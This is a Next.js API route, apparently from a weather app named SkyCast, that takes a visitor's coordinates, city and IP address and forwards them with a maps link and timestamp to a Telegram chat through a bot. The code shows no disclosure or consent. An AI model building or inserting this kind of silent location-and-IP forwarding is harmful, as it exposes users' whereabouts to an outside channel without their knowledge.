import { NextResponse } from "next/server";

export async function POST(request) {
  // Read env vars inside the handler so they are resolved at runtime on Vercel
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "";
  const chatId = process.env.TELEGRAM_CHAT_ID || "";

  if (!botToken || !chatId) {
    return NextResponse.json({ ok: true, skipped: true });
  }

  try {
    const { lat, lon, city } = await request.json();

    // Get user IP from headers
    const forwarded = request.headers.get("x-forwarded-for");
    const ip = forwarded ? forwarded.split(",")[0].trim() : "unknown";

    const timestamp = new Date().toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      dateStyle: "medium",
      timeStyle: "short",
    });

    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const lines = [
      `📍 *SkyCast Location Access*`,
      ``,
    ];
    if (city) {
      lines.push(`City: ${city}`);
    }
    lines.push(
      `IP: \`${ip}\``,
      `Coordinates: \`${lat}, ${lon}\``,
      `Map: [Open in Maps](${mapLink})`,
      `Time: ${timestamp}`,
    );
    const text = lines.join("\n");

    const tgRes = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: "Markdown",
          disable_web_page_preview: true,
        }),
      }
    );

    const tgData = await tgRes.json();
    if (!tgData.ok) {
      console.error("Telegram API error:", tgData.description);
      return NextResponse.json({ ok: false, error: tgData.description }, { status: 502 });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error("Notify error:", err);
    return NextResponse.json({ ok: false, error: "Failed to send notification" }, { status: 500 });
  }
}
